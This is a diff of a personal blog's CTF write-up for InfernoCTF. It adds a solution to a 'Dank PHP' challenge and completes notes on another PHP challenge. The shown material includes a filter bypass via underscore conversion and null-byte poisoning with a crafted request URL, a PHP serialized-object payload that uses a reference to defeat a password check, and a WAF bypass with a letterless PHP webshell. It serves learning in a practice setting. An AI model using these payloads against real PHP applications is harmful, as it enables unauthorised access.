@@ -7,6 +7,9 @@ tags: [Writeups, CTF]
 thumbnail: https://res.cloudinary.com/chankruze/image/upload/v1577522418/blog/CTF/InfernoCTF/logs.png
 desc: "Writeup on the challenges i was able to solve*"
 ---
+{: .align-center}
+![featured-image](https://res.cloudinary.com/chankruze/image/upload/v1577522418/blog/CTF/InfernoCTF/logs.png)
+
 Hi fellas, imma back again but this time i participated an online CTF which was a dream for me ;)
 
 It was a lil frustrating because due to inexperince i wasn't able to solve 3 challenges which was really sneaky and i love them. Here i'll discuss how i approached them.
@@ -137,10 +140,54 @@ Flag: infernoCTF{N1c3_Pl4c3_70_h1d3_1n_th3_Rec0rds}
 ```
 
 #### Dante's Personal Home Page
-`preg_match("/_| /i", $check)` can be passed using `.` which transforms to `_` in php external variables. Thanks to @
+`preg_match("/_| /i", $check)` can be passed using `.` which transforms to `_` in php external variables. Thanks to @13k53c for pointing to the external variable docs.
 
 It was exploiting null byte poisoning to bypass egrep which was the second check (`ereg ("^[a-zA-Z0-9]+$", $magic)`) using `\x00` which encode looks like `A%00`.
 
 The request URL was:`http://104.197.168.32:17011/?..magic..=A%00$dark$`
+
+**UPDATE**
+
+#### Dank PHP
+First i created a `test.php` file to generate searilized data for the `id`. Which looks like below snippet:
+
+```php
+<?php
+
+class user {
+  var $name;
+  var $pass;
+  var $secret;
+}
+
+$new_user = new user();
+
+$new_user->name = "admin";
+$new_user->pass = &$new_user->secret;
+
+echo (serialize($new_user));
+
+?>
+```
+
+This generates the serialized data `O:4:"user":3:{s:4:"name";s:5:"admin";s:4:"pass";N;s:6:"secret";R:3;}` for `id` param. Then i used python `urllib` to encode it properly:
+
+```python
+>>> import urllib
+>>> urllib.quote('O:4:"user":3:{s:4:"name";s:5:"admin";s:4:"pass";N;s:6:"secret";R:3;}')
+'O%3A4%3A%22user%22%3A3%3A%7Bs%3A4%3A%22name%22%3Bs%3A5%3A%22admin%22%3Bs%3A4%3A%22pass%22%3BN%3Bs%3A6%3A%22secret%22%3BR%3A3%3B%7D'
+```
+
+Now the second part was to bypass WAF and run `echoFlag()`. Which can be done with Php webshell without numbers and letters. And there was also a length limitation of 45 digits. So we required string length 45. Thanks to @13k53c again, he was able to discover [40 digits webshell](https://gist.github.com/mvisat/03592a5ab0743cd43c2aa65bf45fef21).
+
+Now the `caption` param becomes `caption = "$_=" + make_letters("echoFlag") + ";$_();"`.
+
+I was about to write my curl style here but @13k53c shared his awesome python script to do whole process and print the flag in one script. The script is [here](https://ideone.com/xxJmE0).
+
+```text
+Flag: infernoCTF{pHp_1s_a_h34dache}
+```
+
+Yeh definitely, it was a headache ;(
 
 Thanks for reading ;) Will update it later when ingoing challenges are solved. Btw imma doing another CTF so, this is it !
